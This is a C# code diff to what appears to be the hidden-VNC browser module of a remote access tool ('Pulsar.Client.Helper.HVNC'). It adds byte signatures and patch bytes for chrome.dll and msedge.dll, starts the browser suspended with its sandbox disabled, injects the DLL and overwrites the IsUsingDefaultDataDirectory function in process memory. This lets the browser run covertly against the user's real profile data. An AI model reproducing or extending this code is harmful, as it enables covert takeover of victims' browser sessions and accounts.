@@ -22,13 +22,27 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
 
         private string RealAppData { get; set; } = null;
         private string FakeAppData { get; set; } = null;
+        private string ChromiumDllName { get; set; } = null;
+
+        private static readonly Dictionary<string, byte[]> DllPatches = new Dictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase)
+        {
+            { "chrome.dll", new byte[] { 0x56, 0x48, 0x89, 0xCE, 0xB0, 0x01, 0x88, 0x06, 0x88, 0x46, 0x01, 0x5E, 0xC3 } },
+            { "msedge.dll", new byte[] { 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3 } }
+        };
+
+        private static readonly Dictionary<string, string> DllPatterns = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+        {
+            { "chrome.dll", "56 48 83 EC 70 ?? ?? ?? ?? ?? 48 89 CE 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 ?? ?? ?? ?? 48 8D 54 24" },
+            //{ "msedge.dll", "41 56 56 57 53 48 81 EC 98 00 00 00 0F ?? ?? ?? ?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 78 49 BE" }
+            { "msedge.dll", "41 56 56 57 53 48 81 EC 98 00 00 00 0F ?? ?? ?? ?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 78 49 BE AA AA AA AA AA AA AA AA 48 ?? ?? ?? ?? 4C ?? ?? 10 0F 28 ?? ?? ?? ?? ?? 0F ?? ?? 48 89 F1 E8 ?? ?? ?? ?? B9 E9 ?? ?? ?? 48 89 F2 E8 ?? ?? ?? ?? 48 8D ?? ?? ??" }
+        };
 
         /// <summary>
         /// Creates a new PrinterPatcher instance
         /// </summary>
         /// <param name="chromeexepath">Path to chrome.exe</param>
         /// <param name="chromeInstallDir">Path to Chrome installation directory (containing version folders)</param>
-        public PrinterPatcher(string chromeexepath, string chromeInstallDir, string globalBorwserName)
+        public PrinterPatcher(string chromeexepath, string chromeInstallDir, string globalBorwserName, string chromiumDllName)
         {
             if (string.IsNullOrEmpty(chromeexepath))
                 throw new ArgumentNullException(nameof(chromeexepath));
@@ -37,6 +51,8 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 throw new ArgumentNullException(nameof(chromeInstallDir));
 
             ChromiumExePath = chromeexepath;
+
+            ChromiumDllName = chromiumDllName;
 
             // Find the latest Chrome version folder with chrome.dll
             string latestVersionFolder = FindLatestChromeVersion(chromeInstallDir);
@@ -48,7 +64,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             ChromiumBrowserName = globalBorwserName;
 
             ChromiumInstallFolderPath = latestVersionFolder;
-            ChromiumDllPath = Path.Combine(ChromiumInstallFolderPath, "chrome.dll");
+            ChromiumDllPath = Path.Combine(ChromiumInstallFolderPath, chromiumDllName);
 
             ValidatePaths();
         }
@@ -83,7 +99,8 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     string folderName = Path.GetFileName(dir);
                     if (folderName.Length > 0 && char.IsDigit(folderName[0]))
                     {
-                        string dllPath = Path.Combine(dir, "chrome.dll");
+                        string dllPath = Path.Combine(dir, ChromiumDllName);
+                        Debug.WriteLine(dllPath);
                         if (File.Exists(dllPath))
                         {
                             versionFolders.Add(dir);
@@ -115,6 +132,8 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             // I admit when I'm defeated. This is 100% chatGPT. We were able to figure out offsets but not the RVA portion and automating a way to get the offset. (Thank you gpt4.1).
             try
             {
+                Debug.WriteLine($"> FileOffsetToRVA called for '{filePath}', fileOffset=0x{fileOffset:X}");
+
                 if (!File.Exists(filePath))
                 {
                     Debug.WriteLine($"> ERROR: File '{filePath}' does not exist");
@@ -122,6 +141,8 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 }
 
                 byte[] fileData = File.ReadAllBytes(filePath);
+                Debug.WriteLine($"> Read {fileData.Length} bytes from file");
+
                 if (fileData.Length < 64)
                 {
                     Debug.WriteLine("> ERROR: File is too small to be a valid PE file");
@@ -130,6 +151,8 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
 
                 // Read DOS header to find PE header offset
                 uint peOffset = BitConverter.ToUInt32(fileData, 0x3C);
+                Debug.WriteLine($"> PE header offset: 0x{peOffset:X}");
+
                 if (peOffset + 24 > fileData.Length)
                 {
                     Debug.WriteLine("> ERROR: Invalid PE header offset");
@@ -137,7 +160,10 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 }
 
                 // Verify PE signature
-                if (BitConverter.ToUInt32(fileData, (int)peOffset) != 0x00004550)  // "PE\0\0"
+                uint peSignature = BitConverter.ToUInt32(fileData, (int)peOffset);
+                Debug.WriteLine($"> PE signature: 0x{peSignature:X} (should be 0x00004550)");
+
+                if (peSignature != 0x00004550)  // "PE\0\0"
                 {
                     Debug.WriteLine("> ERROR: Invalid PE signature");
                     return 0;
@@ -145,34 +171,44 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
 
                 // Get number of sections
                 ushort numSections = BitConverter.ToUInt16(fileData, (int)peOffset + 6);
+                Debug.WriteLine($"> Number of sections: {numSections}");
+
+                // Get size of optional header
+                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(fileData, (int)peOffset + 20);
+                Debug.WriteLine($"> Size of Optional Header: {sizeOfOptionalHeader}");
 
                 // Find section headers offset (PE header + size of FileHeader + size of OptionalHeader)
-                uint sectionHeadersOffset = peOffset + 24 + BitConverter.ToUInt16(fileData, (int)peOffset + 20);
+                uint sectionHeadersOffset = peOffset + 24 + sizeOfOptionalHeader;
+                Debug.WriteLine($"> Section headers offset: 0x{sectionHeadersOffset:X}");
 
-                // Find the section that contains the file offset
+                // Print section info for debugging
                 for (int i = 0; i < numSections; i++)
                 {
                     uint sectionOffset = sectionHeadersOffset + (uint)(i * 40); // Each section header is 40 bytes
-
                     if (sectionOffset + 40 > fileData.Length)
                     {
-                        Debug.WriteLine("> ERROR: Section header extends beyond file size");
+                        Debug.WriteLine($"> ERROR: Section header {i + 1} extends beyond file size");
                         break;
                     }
 
-                    uint pointerToRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 20);
-                    uint sizeOfRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 16);
+                    // Section name (8 bytes)
+                    string sectionName = Encoding.ASCII.GetString(fileData, (int)sectionOffset, 8).TrimEnd('\0');
+                    uint virtualSize = BitConverter.ToUInt32(fileData, (int)sectionOffset + 8);
                     uint virtualAddress = BitConverter.ToUInt32(fileData, (int)sectionOffset + 12);
+                    uint sizeOfRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 16);
+                    uint pointerToRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 20);
+
+                    Debug.WriteLine($"> Section {i + 1}: Name='{sectionName}', VirtualSize=0x{virtualSize:X}, VirtualAddress=0x{virtualAddress:X}, SizeOfRawData=0x{sizeOfRawData:X}, PointerToRawData=0x{pointerToRawData:X}");
 
                     // Check if file offset is within this section
                     if (fileOffset >= pointerToRawData && fileOffset < pointerToRawData + sizeOfRawData)
                     {
-                        // Calculate RVA by adding the offset within the section to the section's RVA
                         uint offsetWithinSection = fileOffset - pointerToRawData;
                         uint rva = virtualAddress + offsetWithinSection;
 
-                        Debug.WriteLine($"> Successfully converted file offset 0x{fileOffset:X} to RVA 0x{rva:X}");
-                        Debug.WriteLine($"> Section: {i + 1}, RawAddress: 0x{pointerToRawData:X}, VirtualAddress: 0x{virtualAddress:X}");
+                        Debug.WriteLine($"> File offset 0x{fileOffset:X} found in section '{sectionName}' (#{i + 1})");
+                        Debug.WriteLine($"> Offset within section: 0x{offsetWithinSection:X}");
+                        Debug.WriteLine($"> Calculated RVA: 0x{rva:X}");
 
                         return rva;
                     }
@@ -191,10 +227,11 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         /// <summary>
         /// Finds the offset of the target function in the chrome.dll
         /// </summary>
-        private int FindMatchOffset(byte[] src)
+        private int FindMatchOffset(byte[] src, string dllName)
         {
-            var offsets = new List<int>();
-            string pattern = "56 48 83 EC 70 ?? ?? ?? ?? ?? 48 89 CE 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 ?? ?? ?? ?? 48 8D 54 24";
+            if (!DllPatterns.TryGetValue(dllName, out string pattern))
+                return 0;
+
             string[] patternSplit = pattern.Split(' ');
             byte[] newBytes = new byte[patternSplit.Length];
             List<int> wildcards = new List<int>();
@@ -212,6 +249,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 }
             }
 
+            List<int> foundOffsets = new List<int>();
             for (int i = 0; i <= src.Length - newBytes.Length; i++)
             {
                 bool match = true;
@@ -224,10 +262,19 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     }
                 }
                 if (match)
-                    return i;
+                    foundOffsets.Add(i);
             }
 
-            return 0;
+            if (foundOffsets.Count > 0)
+            {
+                Debug.WriteLine($"> Pattern found {foundOffsets.Count} time(s) at offsets: {string.Join(", ", foundOffsets.Select(x => $"0x{x:X8}"))}");
+                return foundOffsets[0];
+            }
+            else
+            {
+                Debug.WriteLine("> Pattern not found.");
+                return 0;
+            }
         }
 
         /// <summary>
@@ -267,7 +314,14 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             Parallel.ForEach(files, file =>
             {
                 string temppath = Path.Combine(destDirName, file.Name);
-                file.CopyTo(temppath, false);
+                try
+                {
+                    file.CopyTo(temppath, false);
+                } catch (Exception ex)
+                {
+                    Debug.WriteLine($"> ERROR copying file '{file.FullName}' to '{temppath}': {ex.Message}"); // Log the error
+                }
+                
             });
 
             Parallel.ForEach(dirs, subdir =>
@@ -295,72 +349,77 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             Debug.WriteLine("> Restored %LOCALAPPDATA% environment variable");
         }
 
-        private bool ApplyPatch(int pid, int offset)
+        private bool ApplyPatch(int pid, int offset, string dllName)
         {
             try
             {
                 DllInjector.InjectDll(pid, ChromiumDllPath);
-                Debug.WriteLine("> Loaded chrome.dll into chrome process");
+                Debug.WriteLine($"> Loaded {dllName} into chrome process");
 
-                // Wait a moment for the DLL to be fully loaded
                 Thread.Sleep(1000);
 
                 IntPtr chromeDllBaseAddress = IntPtr.Zero;
                 Process targetProcess = Process.GetProcessById(pid);
-
-                // Refresh the process modules to ensure we see the newly injected DLL
                 targetProcess.Refresh();
 
-                Console.WriteLine("> Searching for chrome.dll in process modules:");
                 foreach (ProcessModule module in targetProcess.Modules)
                 {
-                    Console.WriteLine("  Module: " + module.FileName);
-
-                    // Check both the filename and module name
-                    if (module.FileName.ToLower().Contains("chrome.dll") ||
-                        module.ModuleName.ToLower().Contains("chrome.dll"))
+                    if (module.FileName.ToLower().Contains(dllName.ToLower()) ||
+                        module.ModuleName.ToLower().Contains(dllName.ToLower()))
                     {
                         chromeDllBaseAddress = module.BaseAddress;
-                        Console.WriteLine("> Found chrome.dll at address: {0:X}", (ulong)chromeDllBaseAddress);
                         break;
                     }
                 }
 
                 if (chromeDllBaseAddress == IntPtr.Zero)
-                {
-                    Console.WriteLine("> ERROR: chrome.dll not found in process modules after injection");
-                    Console.WriteLine("> Available modules:");
-                    foreach (ProcessModule module in targetProcess.Modules)
-                    {
-                        Console.WriteLine("    {0} (Base: {1:X})", module.FileName, (ulong)module.BaseAddress);
-                    }
                     return false;
-                }
-                Console.WriteLine("> Got address of chrome.dll: {0:X}", (ulong)chromeDllBaseAddress);
 
-                // we need RVA to calc ts
-                string dllPath = ChromiumInstallFolderPath + "\\chrome.dll";
+                string dllPath = Path.Combine(ChromiumInstallFolderPath, dllName);
                 uint rva = FileOffsetToRVA(dllPath, (uint)offset);
                 if (rva == 0)
-                {
-                    Console.WriteLine("> ERROR: Failed to convert file offset to RVA");
                     return false;
-                }
 
                 IntPtr targetFunction = IntPtr.Add(chromeDllBaseAddress, (int)rva);
-                Console.WriteLine("> Calculated address of IsUsingDefaultDataDirectory function: {0:X}", (ulong)targetFunction);
 
-                byte[] PatchBytes = new byte[] { 0x56, 0x48, 0x89, 0xCE, 0xB0, 0x01, 0x88, 0x06, 0x88, 0x46, 0x01, 0x5E, 0xC3 };
-                //byte[] PatchBytes = new byte[] { 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3 };
+                // Use the patch from the dictionary
+                if (!DllPatches.TryGetValue(dllName, out var patchBytes))
+                    return false;
 
-                int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, PatchBytes);
-                Console.WriteLine("> Wrote {0} bytes to memory", bytesWritten);
 
-                return bytesWritten == PatchBytes.Length;
+                // Read the original bytes before patching
+                byte[] originalBytes = new byte[patchBytes.Length];
+                if (NativeMemory.ReadMemory(pid, targetFunction, originalBytes))
+                {
+                    // Print original bytes
+                    StringBuilder originalHex = new StringBuilder();
+                    foreach (byte b in originalBytes)
+                    {
+                        originalHex.AppendFormat("0x{0:X2} ", b);
+                    }
+                    Debug.WriteLine($"> Original bytes at target location ({originalBytes.Length} bytes):");
+                    Debug.WriteLine($"> {originalHex}");
+                }
+                else
+                {
+                    Debug.WriteLine("> Failed to read original bytes from target location");
+                }
+
+                // Print patch bytes
+                StringBuilder bytesHex = new StringBuilder();
+                foreach (byte b in patchBytes)
+                {
+                    bytesHex.AppendFormat("0x{0:X2} ", b);
+                }
+                Debug.WriteLine($"> Patch bytes to be applied ({patchBytes.Length} bytes):");
+                Debug.WriteLine($"> {bytesHex}");
+
+                int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, patchBytes);
+                return bytesWritten == patchBytes.Length;
             }
             catch (Exception ex)
             {
-                Console.WriteLine("> ERROR in ApplyPatch: " + ex.Message);
+                Debug.WriteLine($"> Error applying patch: {ex.Message}");
                 return false;
             }
         }
@@ -393,23 +452,26 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 return;
             }
 
-            // Patch logic as before
-            byte[] chromeDll = ReadChromeDll();
-            Debug.WriteLine("> Read {0} bytes from chrome.dll", chromeDll.Length);
-            if (chromeDll.Length == 0) return;
+            // Determine DLL name from path
+            string dllName = Path.GetFileName(ChromiumDllPath);
 
-            int offset = FindMatchOffset(chromeDll);
-            Debug.WriteLine("> Offset of chrome::IsUsingDefaultDataDirectory function: {0:X8}", offset);
+            byte[] dllBytes = ReadChromeDll();
+            Debug.WriteLine($"> Read {dllBytes.Length} bytes from {dllName}");
+            if (dllBytes.Length == 0) return;
+
+            int offset = FindMatchOffset(dllBytes, dllName);
+            Debug.WriteLine($"> Offset of {dllName} target function: {offset:X8}");
             if (offset == 0) return;
+
 
             EnableEnvironmentVariableFucker();
             int chromePid = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
-            Debug.WriteLine("> Created suspended chrome process: {0}", chromePid);
+            Debug.WriteLine($"> Created suspended chrome process: {chromePid}");
             DisableEnvironmentVariableFucker();
 
-            if (ApplyPatch(chromePid, offset))
+            if (ApplyPatch(chromePid, offset, dllName))
             {
-                Debug.WriteLine("> Applied IsUsingDefaultDataDirectory patch to chrome process");
+                Debug.WriteLine($"> Applied patch to {dllName} in chrome process");
                 ProcessHelper.ResumeProcess(chromePid);
                 Debug.WriteLine("> Resumed chrome process");
             }
@@ -425,6 +487,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         private const uint PROCESS_VM_WRITE = 0x0020;
         private const uint PROCESS_VM_OPERATION = 0x0008;
         private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        private const uint PROCESS_VM_READ = 0x0010;
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
@@ -438,7 +501,47 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             out UIntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ReadProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            UIntPtr nSize,
+            out UIntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
+
+        public static bool ReadMemory(int pid, IntPtr baseAddress, byte[] buffer)
+        {
+            if (buffer == null || buffer.Length == 0)
+                throw new ArgumentException("Buffer is null or empty.", nameof(buffer));
+
+            IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+            if (hProcess == IntPtr.Zero)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Debug.WriteLine($"> Failed to open process for reading: {new System.ComponentModel.Win32Exception(error).Message}");
+                return false;
+            }
+
+            try
+            {
+                bool result = ReadProcessMemory(hProcess, baseAddress, buffer, (UIntPtr)buffer.Length, out UIntPtr bytesRead);
+
+                if (!result || bytesRead.ToUInt32() != buffer.Length)
+                {
+                    int errorCode = Marshal.GetLastWin32Error();
+                    Debug.WriteLine($"> Failed to read memory: {new System.ComponentModel.Win32Exception(errorCode).Message}");
+                    return false;
+                }
+
+                return true;
+            }
+            finally
+            {
+                CloseHandle(hProcess);
+            }
+        }
 
         public static int WriteMemory(int pid, IntPtr baseAddress, byte[] data)
         {
